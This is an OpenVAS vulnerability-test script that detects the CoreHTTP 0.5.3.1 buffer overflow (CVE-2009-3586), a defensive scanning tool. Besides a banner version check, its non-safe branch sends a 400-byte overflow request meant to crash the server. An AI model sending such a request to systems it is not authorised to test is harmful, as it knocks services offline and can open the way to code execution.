###############################################################################
# OpenVAS Vulnerability Test
# $Id: CoreHTTP_37237.nasl 13215 2019-01-22 11:59:45Z cfischer $
#
# CoreHTTP 'src/http.c ' Buffer Overflow Vulnerability
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100377");
  script_version("$Revision: 13215 $");
  script_tag(name:"last_modification", value:"$Date: 2019-01-22 12:59:45 +0100 (Tue, 22 Jan 2019) $");
  script_tag(name:"creation_date", value:"2009-12-08 12:57:07 +0100 (Tue, 08 Dec 2009)");
  script_bugtraq_id(37237);
  script_cve_id("CVE-2009-3586");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("CoreHTTP 'src/http.c ' Buffer Overflow Vulnerability");
  script_category(ACT_MIXED_ATTACK);
  script_tag(name:"qod_type", value:"remote_banner");
  script_family("Web Servers");
  script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
  script_dependencies("gb_get_http_banner.nasl");
  script_require_ports("Services/www", 5555);
  script_mandatory_keys("corehttp/banner");

  script_tag(name:"summary", value:"CoreHTTP is prone to a buffer-overflow vulnerability because it fails
  to adequately bounds-check user-supplied data.");

  script_tag(name:"impact", value:"Attackers can exploit this issue to execute arbitrary code within the
  context of the affected application. Failed exploit attempts will
  result in a denial of service.");

  script_tag(name:"affected", value:"This issue affects CoreHTTP 0.5.3.1. Other versions may also
  be affected.");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/37237");
  script_xref(name:"URL", value:"http://corehttp.sourceforge.net/");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/508272");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  exit(0);
}

include("http_func.inc");
include("version_func.inc");

port = get_http_port(default:5555);

banner = get_http_banner(port: port);
if(!banner || ! egrep(pattern:"Server: corehttp", string:banner))
  exit(0);

if(safe_checks()) {
  version = eregmatch(pattern:"Server: corehttp-([0-9.]+)", string:banner);
  if(!isnull(version[1])) {
    if(version_is_equal(version:version[1], test_version:"0.5.3.1")) {
      security_message(port:port);
      exit(0);
    }
  }
} else {

  if(http_is_dead(port:port))
    exit(0);

  soc = http_open_socket(port);
  if(!soc)
    exit(0);

  crap_data = crap(length:400);
  req = string(crap_data, "/index.html HTTP/1.1\r\n\r\n");
  send(socket:soc, data:req);

  if(http_is_dead(port:port)) {
    security_message(port:port);
    exit(0);
  }
}

exit(0);